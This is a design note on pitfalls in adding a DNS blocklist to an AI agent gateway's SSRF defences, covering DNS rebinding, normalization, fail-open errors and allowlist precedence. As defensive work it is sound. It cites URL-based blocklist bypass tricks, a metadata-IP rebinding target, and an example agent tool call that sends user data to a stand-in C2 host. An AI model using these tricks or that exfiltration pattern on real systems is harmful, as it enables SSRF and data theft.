# Domain Pitfalls

**Domain:** DNS blocklist filtering in an AI agent gateway
**Researched:** 2026-03-08

## Critical Pitfalls

Mistakes that cause security bypasses or require rewrites.

### Pitfall 1: Blocklist check runs after DNS resolution (TOCTOU with DNS rebinding)

**What goes wrong:** The blocklist is checked against the literal hostname before DNS, but an attacker crafts a domain that passes the blocklist check, then DNS-rebinds to a different target between the pre-DNS check and actual connection. More subtly: if the blocklist check and the SSRF two-phase check run as separate sequential calls, an attacker with a short-TTL DNS record can cause the domain to resolve differently between the blocklist lookup and the SSRF pinning step.

**Why it happens:** The existing SSRF module already solves this with DNS pinning (resolve once, pin the result, use pinned lookup for the actual connection). The danger is introducing a new blocklist check that does its own DNS resolution or runs outside the pinned pipeline.

**Consequences:** Complete SSRF bypass. An AI agent tool call to `attacker.com` passes the blocklist, but the pinned DNS result connects to `169.254.169.254` or `127.0.0.1`.

**Prevention:** The blocklist check MUST be a pure hostname string operation in Phase 1 (pre-DNS), integrated directly into `resolvePinnedHostnameWithPolicy`. It must NOT perform any DNS lookups of its own. The existing two-phase architecture (Phase 1: literal hostname/IP check, Phase 2: resolved address check) already handles this correctly -- the blocklist is purely a Phase 1 addition.

**Detection:** If you see `dns.lookup` or `dns.resolve` calls in the blocklist module, something is wrong. The blocklist module should have zero network dependencies.

**Phase:** Phase 1 (spike/core implementation). Get this right from the start.

### Pitfall 2: Subdomain matching logic disagrees with normalizeHostname

**What goes wrong:** The blocklist says "block `malware.example.com`" but the check uses a different normalization path than `normalizeHostname()` from `src/infra/net/hostname.ts`. Result: `MALWARE.EXAMPLE.COM.` (trailing dot, uppercase) bypasses the blocklist because the blocklist matcher lowercases but forgets to strip the trailing dot, or vice versa.

**Why it happens:** The existing `normalizeHostname` is simple (trim, lowercase, strip trailing dot, unwrap brackets). But blocklist entries loaded from external sources (Hagezi, StevenBlack) come in varied formats: with/without trailing dots, with comments, with wildcards, with CRLF line endings. If the blocklist parser normalizes differently than the SSRF module, there will be gaps.

**Consequences:** Domains on the blocklist are not actually blocked. Silent security failure with no error signal.

**Prevention:**
1. Always run blocklist entries through the same `normalizeHostname()` at load time.
2. Always run the input hostname through `normalizeHostname()` before checking (the existing `isBlockedHostname` already does this -- follow that pattern exactly).
3. Unit test with explicit edge cases: trailing dot, mixed case, bracket-wrapped IPv6, leading/trailing whitespace, CRLF.

**Detection:** Add a test that loads raw blocklist format lines and verifies they match after normalization. If any entry survives normalization as empty string or differs from what `normalizeHostname` would produce for the same input, the parser has a bug.

**Phase:** Phase 1 (spike). Normalization parity must be established before any list is loaded.

### Pitfall 3: Creating a parallel system instead of extending the existing SSRF infrastructure

**What goes wrong:** A new `dns-blocklist.ts` module is created with its own `isDomainBlocked()` function, its own error class, and callers must remember to call both `isBlockedHostnameOrIp()` AND `isDomainBlocked()`. Some call sites forget. The blocklist and SSRF checks drift apart over time.

**Why it happens:** It feels cleaner to keep the blocklist separate. The existing SSRF module is already ~360 lines with complex IP classification logic. Adding blocklist concerns feels like it muddies the module.

**Consequences:** Incomplete coverage. Of the 36+ files that call `fetchWithSsrFGuard` or `resolvePinnedHostnameWithPolicy`, any that don't also add the blocklist check are unprotected. The browser navigation guard, media fetcher, plugin SDK fetches, and agent web-fetch all become potential gaps.

**Prevention:** The blocklist check must be wired INTO `resolvePinnedHostnameWithPolicy` (or the pre-DNS assertion it calls), not alongside it. A separate `isDomainBlocked()` utility function is fine for unit testing, but the enforcement point must be inside the existing pipeline so all 36+ callers get protection automatically.

**Detection:** `grep -r "isDomainBlocked" src/` should show it imported only in the SSRF module and in tests. If application code imports it directly, the architecture is wrong.

**Phase:** Phase 1 (spike). This is the core architectural decision.

### Pitfall 4: Blocklist bypassed via URL-level tricks (port, auth, encoding)

**What goes wrong:** The blocklist checks `hostname` but the attacker uses URL tricks:
- `http://malware.example.com@benign.com/` (userinfo confusion)
- `http://malware.example.com:80/` vs `http://malware.example.com/` (port normalization)
- `http://malware%2Eexample%2Ecom/` (percent-encoded dots)
- `http://malware.example.com./` (trailing dot in URL)

The URL parser extracts the hostname differently than the blocklist expects.

**Why it happens:** The existing SSRF module works at the hostname level (after `new URL()` parsing extracts `parsed.hostname`). As long as the blocklist check happens after URL parsing and uses the same `parsed.hostname` value, these tricks are neutralized by the URL parser. The risk is if the blocklist operates on raw URL strings instead.

**Consequences:** Blocklist bypass for any domain using URL-level encoding tricks.

**Prevention:** Never check raw URL strings against the blocklist. Always parse with `new URL()` first, extract `.hostname`, then run through `normalizeHostname()`, then check the blocklist. The existing `fetchWithSsrFGuard` already does `new URL(currentUrl)` and passes `parsedUrl.hostname` to `resolvePinnedHostnameWithPolicy` -- this is the correct integration point.

**Detection:** If the blocklist function signature accepts a `url: string` parameter instead of `hostname: string`, the API design is inviting misuse.

**Phase:** Phase 1 (spike). API design decision.

## Moderate Pitfalls

### Pitfall 5: Blocklist loading blocks the gateway startup or hot path

**What goes wrong:** The blocklist is loaded synchronously at module import time, or fetched from a remote URL during gateway startup. A large list (Hagezi's multi list has 300K+ entries) causes a multi-second startup delay. Worse: if loaded on every request, it causes per-request latency.

**Why it happens:** The spike starts with a hardcoded `Set<string>` of 5-10 entries, which is instant. When it evolves to load real lists (300K+ entries from a URL), the naive approach is to `await fetch(listUrl)` at startup.

**Prevention:**
1. Phase 1 (spike): hardcoded `Set<string>` is fine. Keep the data structure as a `Set` for O(1) lookup.
2. Phase 2 (config): load from local file paths synchronously at startup (acceptable for config-driven lists).
3. Phase 3 (remote fetch): load asynchronously in background. Use a stale-while-revalidate pattern: start with empty/built-in list, fetch in background, swap atomically when ready. Never block the request hot path on list loading.
4. For subdomain matching (block `example.com` and all `*.example.com`), a `Set` is insufficient. Use a reversed-label trie or suffix-match structure. But for the spike (exact match + simple `.endsWith` suffix check), a `Set` + linear suffix scan is fine for <1000 entries.

**Detection:** If gateway startup takes >500ms longer after adding the blocklist, or if `resolvePinnedHostnameWithPolicy` shows up in request latency profiles, the loading strategy is wrong.

**Phase:** Phase 1 can ignore this (hardcoded list). Phase 2/3 (config + remote fetch) must address it.

### Pitfall 6: Suffix matching allows overly broad blocks (public suffix confusion)

**What goes wrong:** The blocklist contains `com` as an entry. A naive suffix matcher that checks `.endsWith(".com")` blocks all `.com` domains. Or the blocklist contains `co.uk` and the matcher blocks all `.co.uk` sites.

**Why it happens:** DNS blocklists from community sources sometimes contain entries at the public suffix level (TLDs, effective TLDs). Without public suffix awareness, a suffix-match blocklist can accidentally block huge swaths of the internet.

**Consequences:** Legitimate tool calls fail. AI agents cannot reach any `.com` domain. Hard to debug because the error looks like a normal blocklist block.

**Prevention:**
1. For the spike (hardcoded list): curate entries manually. No TLD or public suffix entries.
2. For config-driven lists: validate entries at load time. Reject any entry that is a known public suffix (use the `publicsuffix-list` or similar). Log a warning.
3. For remote-fetched lists: the major curated lists (Hagezi, StevenBlack, OISD) don't include bare TLDs, but validate anyway.
4. The existing `isHostnameAllowedByPattern` in `ssrf.ts` already handles wildcard patterns carefully (won't match the bare suffix for `*.suffix`). Follow this same defensive pattern for blocklist suffix matching.

**Detection:** A test that attempts to add `com`, `co.uk`, `org` to the blocklist should either be rejected at load time or at minimum logged as a warning.

**Phase:** Phase 2 (config-driven lists). Not relevant for Phase 1 hardcoded spike.

### Pitfall 7: Blocklist errors fail open instead of fail closed

**What goes wrong:** The blocklist file fails to load, or the `Set` is somehow undefined, or a parsing error occurs. The code catches the error and allows the request through rather than blocking it.

**Why it happens:** Defensive coding instinct: "don't break the gateway if the blocklist has a problem." This is backwards for a security feature.

**Consequences:** A corrupted or missing blocklist silently disables all domain filtering. Attacker can trigger this by causing the list fetch to fail.

**Prevention:**
1. If the blocklist cannot be loaded at all, log a loud warning but continue with the built-in hardcoded list (never with an empty list).
2. The `isDomainBlocked` function must never catch-and-swallow. If the Set lookup throws (it shouldn't, but), propagate the error.
3. The integration into `resolvePinnedHostnameWithPolicy` should follow the existing pattern: `assertAllowedHostOrIpOrThrow` throws on block, passes through on allow. A blocklist error is not "allow."

**Detection:** Write a test where the blocklist data source returns garbage. Verify the gateway still blocks known-bad domains (falls back to hardcoded list) rather than allowing everything.

**Phase:** Phase 1 (spike). The fail-closed principle must be established from the start.

### Pitfall 8: allowedHostnames / hostnameAllowlist policy overrides don't interact correctly with blocklist

**What goes wrong:** The existing SSRF module has `allowedHostnames` (skip private network checks for specific hosts) and `hostnameAllowlist` (only allow specific hosts). The blocklist check runs before or after these policy overrides, creating confusing precedence:
- Should an explicitly `allowedHostnames` entry still be blocked by the DNS blocklist?
- Should `hostnameAllowlist` interact with the blocklist at all?

**Why it happens:** The existing SSRF policy has clear semantics: `allowedHostnames` = "trust this hostname for private network checks", `hostnameAllowlist` = "only allow these hostnames." Adding a third layer (blocklist) without defining precedence creates ambiguity.

**Consequences:** Either security gaps (blocklist bypassed by allowlist) or operational breakage (allowlisted domains blocked by stale blocklist entries).

**Prevention:** Define clear precedence:
1. `hostnameAllowlist` (if set) is checked first -- if hostname not in allowlist, reject immediately (existing behavior).
2. DNS blocklist is checked next -- if hostname is on the blocklist, reject. No policy override bypasses the blocklist (it's a security floor, not a preference).
3. `allowedHostnames` only affects private network / IP classification checks (existing behavior). It does NOT exempt from the blocklist.
4. Document this precedence in code comments at the integration point.

**Detection:** Write tests for the interaction: a hostname that is both in `allowedHostnames` AND on the blocklist should be blocked. A hostname in `hostnameAllowlist` AND on the blocklist should be blocked.

**Phase:** Phase 1 (spike). Must be decided at integration time.

## Minor Pitfalls

### Pitfall 9: Blocklist entries with inline comments or mixed formats

**What goes wrong:** Community blocklist formats vary: hosts-file format (`0.0.0.0 malware.com`), Adblock format (`||malware.com^`), plain domain format (`malware.com`), with comments (`# this is bad`), with inline comments (`malware.com # tracker`). A parser that expects plain domains will treat `0.0.0.0 malware.com` as a single hostname entry and never match.

**Prevention:** For the spike (hardcoded list), this is irrelevant. For remote list loading, implement format detection or require a specific format (hosts-file is most common in the DNS blocklist ecosystem: StevenBlack, Hagezi all publish hosts-file format). Parse each line: strip comments (`#` to EOL), split on whitespace, take the last token (the domain), normalize.

**Phase:** Phase 3 (remote list fetch). Not relevant for Phase 1/2.

### Pitfall 10: Logging blocklist hits leaks sensitive information

**What goes wrong:** The blocklist logs `"Blocked DNS request to malware-c2.example.com from agent tool call: web_fetch({url: 'https://malware-c2.example.com/exfil?data=SENSITIVE_USER_DATA'})"`. The full URL with query parameters is logged, potentially containing user data.

**Prevention:** Follow the existing `fetchWithSsrFGuard` logging pattern: log `target=${parsedUrl.origin}${parsedUrl.pathname}` (no query string). Log the blocklist name/reason but not the full URL. The existing audit context pattern (`auditContext?: string`) is the right approach.

**Phase:** Phase 1 (spike). Establish the logging pattern early.

### Pitfall 11: Test helpers mock around the blocklist check

**What goes wrong:** The existing `mockPinnedHostnameResolution` in `src/test-helpers/ssrf.ts` mocks `resolvePinnedHostname` to skip all checks. If the blocklist is integrated into `resolvePinnedHostnameWithPolicy`, tests using this helper won't exercise the blocklist at all, giving false confidence.

**Prevention:** The mock helper is correct for tests that don't care about SSRF/blocklist behavior (they're testing other functionality). But blocklist-specific tests must NOT use this mock. Add a dedicated test that calls `resolvePinnedHostnameWithPolicy` (not the mock) with blocklisted hostnames and verifies rejection. Keep the existing mock as-is for non-security tests.

**Detection:** Blocklist tests should import from `./ssrf.js` directly, not from `../../test-helpers/ssrf.js`.

**Phase:** Phase 1 (spike). Test architecture decision.

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| Phase 1: Spike / core function | Creating parallel system instead of extending SSRF pipeline (Pitfall 3) | Wire `isDomainBlocked` INTO `resolvePinnedHostnameWithPolicy`, not alongside it |
| Phase 1: Spike / core function | Normalization mismatch (Pitfall 2) | Reuse `normalizeHostname()` for both blocklist entries and input hostnames |
| Phase 1: Spike / core function | Policy precedence ambiguity (Pitfall 8) | Define and test: blocklist is never bypassed by allowlist policies |
| Phase 2: Config integration | Blocklist loading perf (Pitfall 5) | Load synchronously at startup for local files; use `Set<string>` for O(1) lookup |
| Phase 2: Config integration | Public suffix confusion (Pitfall 6) | Validate entries at load time, reject bare TLDs |
| Phase 3: Remote list fetch | Format parsing (Pitfall 9) | Support hosts-file format; strip comments, take domain token, normalize |
| Phase 3: Remote list fetch | Fail-open on fetch error (Pitfall 7) | Fall back to hardcoded list, never to empty list |
| Phase 3: Remote list fetch | Startup blocking (Pitfall 5) | Async background fetch with stale-while-revalidate |

## Sources

- `src/infra/net/ssrf.ts` -- existing two-phase SSRF architecture (pre-DNS + post-DNS checks)
- `src/infra/net/hostname.ts` -- `normalizeHostname()` implementation (the single normalization source of truth)
- `src/infra/net/fetch-guard.ts` -- 36+ callers of `resolvePinnedHostnameWithPolicy` showing the enforcement surface
- `src/plugin-sdk/ssrf-policy.ts` -- suffix-based allowlist pattern (model for blocklist suffix matching)
- `src/browser/navigation-guard.ts` -- browser navigation enforcement (another integration surface)
- `src/test-helpers/ssrf.ts` -- test mock pattern (shows what blocklist tests must NOT do)
- `.planning/PROJECT.md` -- project constraints and architecture decisions
- Confidence: HIGH for codebase-specific pitfalls (directly verified in code), MEDIUM for external blocklist format/ecosystem claims (based on training data, not verified against current sources)
